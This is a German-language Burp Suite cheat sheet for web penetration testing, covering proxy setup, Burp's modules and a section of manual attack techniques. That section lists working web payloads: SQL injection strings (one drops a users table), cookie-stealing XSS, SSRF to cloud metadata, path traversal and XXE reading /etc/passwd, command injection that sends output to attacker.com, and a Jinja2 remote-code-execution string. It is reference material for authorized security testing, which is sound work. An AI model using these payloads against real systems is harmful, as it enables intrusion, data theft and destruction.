---
tags:
  - cybersec
  - cheatsheet
  - burpsuite
  - pentesting
  - web-security
  - tools
created: 2026-03-06
author: Duathron
---

# 🕷️ Burp Suite — Pentesting Cheat Sheet

> **Zweck:** Web Application Security Testing / Intercepting Proxy / HTTP Manipulation  
> **Editionen:** Community (free) · Professional · Enterprise  
> **Wichtig:** Nur auf autorisierten Zielen verwenden!

---

## 📐 Grundstruktur & Setup

### Proxy konfigurieren

| Einstellung | Wert |
|---|---|
| Burp Listener | `127.0.0.1:8080` (default) |
| Browser-Proxy | `127.0.0.1:8080` |
| CA-Zertifikat URL | `http://burpsuite` oder `http://127.0.0.1:8080` |
| CA-Zertifikat Datei | `cacert.der` → in Browser als vertrauenswürdig importieren |

### FoxyProxy (Firefox/Chrome) — empfohlene Methode

1. FoxyProxy Extension installieren
2. Neues Profil: `127.0.0.1` Port `8080`
3. Burp CA-Zertifikat importieren: `http://burpsuite` → `CA Certificate`
4. In Firefox: `about:preferences#privacy` → Zertifikate → Importieren

---

## 🧩 Module & Werkzeuge

### Proxy — Traffic abfangen

```
Proxy > Intercept ON  →  Request/Response manuell prüfen & modifizieren
Proxy > HTTP history  →  Alle Requests chronologisch
Proxy > WebSockets    →  WS-Nachrichten live abfangen
```

**Nützliche Shortcuts im Proxy:**

| Aktion | Shortcut |
|---|---|
| Forward (weiterleiten) | `F` |
| Drop (verwerfen) | `D` |
| Send to Repeater | `Ctrl+R` |
| Send to Intruder | `Ctrl+I` |
| Intercept toggle | `Ctrl+T` |

---

### Repeater — Requests manuell wiederholen & anpassen

- **Zweck:** Einzelne Requests isoliert modifizieren und sofort re-senden
- Ideal für: manuelle SQLi-Tests, Auth-Bypass, Parameter Tampering

```
Request aus Proxy → Rechtsklick → "Send to Repeater"
Repeater Tab → Parameter ändern → "Send" → Response analysieren
```

**Typische Burp Repeater-Szenarien:**

```http
# IDOR testen – User-ID im Pfad ändern
GET /api/users/1337/profile HTTP/1.1
→ ändern auf /api/users/1/profile

# Hidden Parameter
POST /login HTTP/1.1
username=admin&password=test&admin=false
→ admin=true setzen

# Header Injection
X-Forwarded-For: 127.0.0.1
X-Original-IP: 127.0.0.1
```

---

### Intruder — Fuzzing & Brute Force

> ⚠️ Community Edition: Rate-Limiter aktiv (sehr langsam). Für Speed → ffuf, hydra, wfuzz nutzen.

#### Attack Types

| Typ | Beschreibung | Anwendungsfall |
|---|---|---|
| **Sniper** | 1 Payload-Set, 1 Position | Single-Parameter Fuzzing |
| **Battering Ram** | 1 Payload-Set → alle Positionen | Gleiches Payload überall |
| **Pitchfork** | N Payload-Sets, 1:1 Pairing | User+Pass-Listen kombiniert |
| **Cluster Bomb** | N Payload-Sets, alle Kombinationen | Brute Force (Kombination) |

#### Workflow

```
1. Request in Intruder senden (Ctrl+I)
2. Positions Tab: §parameter§ markieren
3. Payloads Tab: Wordlist / Payload-Typ wählen
4. "Start Attack" → Ergebnisse nach Status/Length filtern
```

#### Payload-Typen

| Typ | Beschreibung |
|---|---|
| Simple list | Manuelle oder geladene Wordlist |
| Numbers | Numerischer Bereich (z.B. 1–1000) |
| Dates | Datumsbereiche |
| Brute forcer | Alle Zeichenkombinationen |
| Null payloads | Wiederholte identische Requests |
| Username generator | Aus echten Namen generieren |
| ECB block shuffling | Crypto-Angriffe |

---

### Scanner (Pro only) — Automatische Schwachstellenanalyse

```
Ziel: Proxy-Traffic → Rechtsklick → "Actively scan"
Oder: Target > Site map > Rechtsklick auf Host → Scan
```

**Scanner findet u.a.:**
- SQL Injection (blind/error-based/time-based)
- XSS (reflected/stored/DOM)
- XXE, SSRF, SSTI
- Path Traversal, Command Injection
- Broken Access Control, Information Disclosure

---

### Spider / Crawler

```
Target > Site Map → Rechtsklick auf Host → Spider this host
Oder: Dashboard > New Scan → Crawl
```

**Scope-Einstellung (wichtig!):**

```
Target > Scope > Include in scope: https://target.com
→ "Use Suite Scope" in Proxy-Settings aktivieren
→ Verhindert Out-of-Scope Traffic
```

---

### Decoder — Kodierung & Hashing

```
Decoder Tab ODER: Rechtsklick auf Text → "Send to Decoder"
```

| Kodierung | Eingabe | Ausgabe |
|---|---|---|
| URL-Decode | `%3Cscript%3E` | `<script>` |
| Base64-Decode | `YWRtaW4=` | `admin` |
| HTML-Decode | `&lt;script&gt;` | `<script>` |
| Hex-Decode | `48656c6c6f` | `Hello` |

**Chained Decoding:** Mehrfach kodierte Werte schichtweise dekodieren.

---

### Comparer — Responses vergleichen

```
2 Requests/Responses → jeweils "Send to Comparer"
Comparer Tab → "Words" oder "Bytes" diff
```

**Anwendungsfall:** Unterschied zwischen gültiger und ungültiger Session, Auth-Bypass-Erkennung.

---

### Sequencer — Token-Analyse (Randomness)

```
Response mit Token → "Send to Sequencer"
Live capture → Token-Parameter markieren → Start
→ FIPS-Tests und Entropie-Analyse
```

**Ziel:** Session-Token-Vorhersagbarkeit prüfen (schwache Zufälligkeit = Session Hijacking möglich).

---

### Logger (Pro) / Logger++ (Extension)

- Alle HTTP-Requests mit Zeitstempel loggern
- Filterbar nach Host, Method, Status
- Extension **Logger++** aus BApp Store für Community verfügbar

---

## 🎯 Target & Scope

### Scope definieren

```
Target > Scope > Add:
  Protocol: https
  Host: ^target\.com$
  Port: 443
  File: /.*
```

**Scope-basierter Proxy-Filter:**

```
Proxy > Options > Intercept client requests:
  ☑ URL is in target scope
```

### Site Map analysieren

```
Target > Site Map → Alle entdeckten Endpunkte
Rechtsklick → Add to scope / Spider / Scan / Send to Intruder
Filter: Show only in-scope items
```

---

## 🔍 Manuelle Angriffstechniken

### SQL Injection — Erkennung

```http
# Einfache Tests im Repeater
' OR '1'='1
' OR 1=1--
' OR 1=1#
admin'--
" OR ""="
1; DROP TABLE users--

# Blind SQLi (Time-based)
' OR SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--   (MSSQL)
```

### XSS — Payloads

```html
<!-- Reflected XSS -->
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(document.cookie)</script>

<!-- Filter Bypass -->
<ScRiPt>alert(1)</ScRiPt>
<script>alert`1`</script>
javascript:alert(1)
```

### SSRF — Server Side Request Forgery

```
# Interner Dienst abfragen
url=http://127.0.0.1:80/admin
url=http://169.254.169.254/latest/meta-data/   (AWS Metadata)
url=http://192.168.1.1/
url=file:///etc/passwd

# Bypass-Techniken
url=http://127.1/
url=http://2130706433/   (127.0.0.1 als Integer)
url=http://127.0.0.1.nip.io/admin
```

### Path Traversal / LFI

```
# Basic
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
....//....//etc/passwd

# Windows
..\..\..\windows\system32\drivers\etc\hosts
%2e%2e%5c%2e%2e%5c

# Null Byte (alte PHP)
/etc/passwd%00
```

### IDOR — Insecure Direct Object Reference

```
# Typische Fundstellen im Repeater
GET /api/invoice/1042     → 1041, 1043...
GET /user?id=5            → id=1, id=2...
POST /download            → {"file_id": 3} → 1, 2...

# UUID IDOR → UUIDs aus anderen Responses sammeln
```

### XXE — XML External Entity

```xml
<!-- Basic XXE -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Blind XXE via OOB -->
<!DOCTYPE root [
  <!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd">
  %ext;
]>
```

### Command Injection

```bash
# Parameter in Repeater testen
; id
| id
` id`
$(id)
&& id
|| id

# Blind (OOB via DNS/HTTP)
; curl http://attacker.com/`id`
; nslookup attacker.com
```

### SSTI — Server Side Template Injection

```
# Erkennung
{{7*7}}        → 49 = Jinja2/Twig
${7*7}         → 49 = Freemarker
<%= 7*7 %>     → 49 = ERB (Ruby)
#{7*7}         → 49 = Pebble

# Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

---

## 🧰 BApp Store — Wichtige Extensions

| Extension | Zweck |
|---|---|
| **Logger++** | Erweiterter Logger mit Filtern |
| **Turbo Intruder** | Hochgeschwindigkeits-Fuzzer (Race Conditions) |
| **Active Scan++** | Erweiterte Scanner-Checks |
| **Param Miner** | Versteckte Parameter & Header finden |
| **JWT Editor** | JWT-Tokens analysieren & manipulieren |
| **Autorize** | Broken Access Control automatisch testen |
| **Hackvertor** | Encoder/Decoder mit vielen Formaten |
| **Retire.js** | Verwundbare JS-Bibliotheken erkennen |
| **HUNT** | Parameter nach Vuln-Typ kategorisieren |
| **HTTP Request Smuggler** | Request-Smuggling-Angriffe |
| **CSRF Scanner** | CSRF-Schwachstellen erkennen |
| **Collaborator Everywhere** | Out-of-Band Interaktionen injizieren |

### Burp Collaborator (Pro) — Out-of-Band Testing

```
Burp Menu → Burp Collaborator Client → "Copy to clipboard"
→ Payload in anfällige Parameter einsetzen
→ Auf eingehende DNS/HTTP-Anfragen warten = Blind Vuln bestätigt
```

---

## 🔐 Authentifizierungsangriffe

### Login Brute Force (Intruder — Pitchfork)

```
POST /login HTTP/1.1

username=§admin§&password=§password123§

Payload 1: usernames.txt
Payload 2: passwords.txt
→ Status 302 oder diff. Content-Length = Hit
```

### JWT-Angriffe (mit JWT Editor Extension)

```
# None-Algorithm Attack
Header: {"alg": "none", "typ": "JWT"}
Signatur entfernen → senden

# HS256 → RS256 Confusion
# Weak Secret Brute Force
hashcat -a 0 -m 16500 <JWT> wordlist.txt

# Key Confusion (RS256 Public Key als HS256 Secret)
```

### Session Fixation / Cookie-Manipulation

```
Proxy → Response abfangen → Set-Cookie modifizieren
Decoder → Cookie-Wert dekodieren → analysieren
Repeater → Session-Token manuell tauschen
```

---

## 📡 WebSocket-Testing

```
Proxy > WebSockets history → Nachrichten live abfangen
Rechtsklick → "Send to Repeater"
→ WS-Nachrichten modifizieren & re-senden

# Typische WS-Angriffe
- Message Manipulation (Parameter Tampering)
- Cross-Site WebSocket Hijacking (CSWSH)
- Injection via WS-Payload
```

---

## ⚙️ Nützliche Burp-Einstellungen

### Performance (Community)

```
Proxy > Options > Miscellaneous:
  ☑ Disable web interface at http://burpsuite
  
Intruder:
  Threads: 1 (Community Limit)
  → Alternativ: ffuf / wfuzz für Speed
```

### Match & Replace (Automatisches Patchen)

```
Proxy > Options > Match and Replace:
  Beispiel:
  Type: Request header
  Match: User-Agent: Mozilla.*
  Replace: User-Agent: Googlebot/2.1
  
  Oder: Cookie-Wert automatisch ersetzen
  Oder: Role-Claim in JWT automatisch auf "admin" patchen
```

### Upstream Proxy (Tor / Corporate)

```
User options > Connections > Upstream Proxy Servers
  Destination: *
  Proxy host: 127.0.0.1
  Proxy port: 9050   (Tor SOCKS5)
  Type: SOCKS5
```

---

## 🗺️ Typischer Pentest-Workflow mit Burp

```
1. SCOPE definieren (Target > Scope)
2. Browser konfigurieren (FoxyProxy → Burp)
3. Manuell durch die Anwendung navigieren
   → Alle Requests in HTTP History sammeln
4. Spider / Crawl starten
5. Site Map analysieren → interessante Endpunkte markieren
6. Manuelle Tests im Repeater:
   - Auth-Flows, IDOR, Parametertest
7. Intruder / Turbo Intruder für Fuzzing
8. Scanner (Pro) für automatische Checks
9. Findings dokumentieren (Notes-Tab oder extern)
```

---

## 🎓 Burp Keyboard Shortcuts

| Aktion | Shortcut |
|---|---|
| Send to Repeater | `Ctrl+R` |
| Send to Intruder | `Ctrl+I` |
| Send to Decoder | `Ctrl+Shift+D` |
| Forward Proxy Request | `Ctrl+F` |
| URL-encode Selektion | `Ctrl+U` |
| URL-decode Selektion | `Ctrl+Shift+U` |
| Kommentar hinzufügen | `Ctrl+M` (in History) |
| Highlight Request | Rechtsklick → Highlight |
| Neuer Tab (Repeater) | `Ctrl+T` |

---

## 📋 Quick Reference — HTTP Response Codes im Pentest

| Code | Bedeutung | Pentest-Relevanz |
|---|---|---|
| `200` | OK | Normale Response |
| `301/302` | Redirect | Auth-Bypass, SSRF |
| `400` | Bad Request | Parameter-Fehler erkannt |
| `401` | Unauthorized | Auth benötigt |
| `403` | Forbidden | Access Control → Bypass versuchen |
| `404` | Not Found | Pfad existiert nicht |
| `405` | Method Not Allowed | Andere HTTP-Methode testen |
| `500` | Internal Server Error | Potenzieller Injection-Punkt |
| `502/503` | Bad Gateway | SSRF / Backend-Infos |

---

## 🔗 Ressourcen

- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — Offizielle Labs
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — Payload-Sammlung
- [HackTricks](https://book.hacktricks.xyz) — Techniken & Checklisten
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

> ⚠️ **Legal Disclaimer:** Dieses Cheat Sheet dient ausschließlich zu Bildungszwecken und für autorisierte Penetration Tests. Die Nutzung dieser Techniken ohne explizite Genehmigung des Zielsystems ist illegal.
